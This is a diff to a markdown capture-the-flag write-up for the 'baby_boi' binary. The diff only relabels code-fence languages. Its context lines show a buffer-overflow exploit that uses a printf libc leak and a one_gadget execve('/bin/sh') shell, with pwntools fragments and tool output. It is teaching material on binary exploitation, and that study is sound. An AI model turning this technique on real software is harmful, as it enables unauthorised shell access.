@@ -2,7 +2,7 @@
 
 Let's take a look at the binary, libc file, and source code. For this challenge we do get a copy of it:
 
-```
+```c
 $    file baby_boi
 baby_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1ff55dce2efc89340b86a666bba5e7ff2b37f62, not stripped
 $    pwn checksec baby_boi
@@ -48,7 +48,7 @@ So we can see that the binary just prompts us for text. Looking at the source co
 
 So to exploit this, we will use the buffer overflow. We will call a oneshot gadget, which is a single ROP gadget in the libc that will call `execve("/bin/sh")` given the right conditions. We can find this using the `one_gadget` utility (https://github.com/david942j/one_gadget):
 
-```
+```console
 $    one_gadget libc-2.27.so
 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
 constraints:
@@ -69,7 +69,7 @@ So leveraging the libc infoleak with the `printf` statement to the libc `printf`
 
 Putting it all together, we have the following exploit. This was ran on `Ubuntu 18.04`:
 
-```
+```python
 from pwn import *
 
 # Establish the target
@@ -102,7 +102,7 @@ target.interactive()
 
 When we run the exploit:
 
-```
+```console
 $    python exploit.py
 [+] Starting local process './baby_boi': pid 12693
 [*] '/home/guyinatuxedo/Desktop/babyboi/libc-2.27.so'
@@ -129,7 +129,7 @@ Your system might not be compatible with the provided `libc` version, but you ca
 
 1. Figure out your `libc` path:
 
-```bash
+```console
 $ ldd ./baby_boi
 
   linux-vdso.so.1 =>  (0x00007fff3e1f3000)
@@ -141,7 +141,7 @@ We can see that our `libc` sits in `/lib/libc.so.6`
 
 2. Now we can find the `one_gadget` for your `libc` version:
 
-```bash
+```console
 $ one_gadget /lib/libc.so.6
 ```
 
